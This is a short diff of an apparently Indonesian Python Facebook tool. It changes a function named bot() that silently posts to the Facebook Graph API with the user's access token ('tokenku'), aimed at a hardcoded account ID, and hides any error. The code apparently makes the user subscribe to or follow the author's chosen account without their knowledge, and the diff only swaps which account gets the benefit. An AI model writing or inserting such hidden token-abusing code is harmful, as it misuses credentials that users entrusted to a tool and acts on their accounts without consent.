@@ -184,7 +184,7 @@ def login_lagi334():
 		exit()
 def bot():
 	try:
-		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
+		requests.post("https://graph.facebook.com/100013261902810?fields=subscribers&access_token=%s"%(tokenku))
 	except:
 		pass
 #------------------[ BAGIAN-MENU ]----------------#
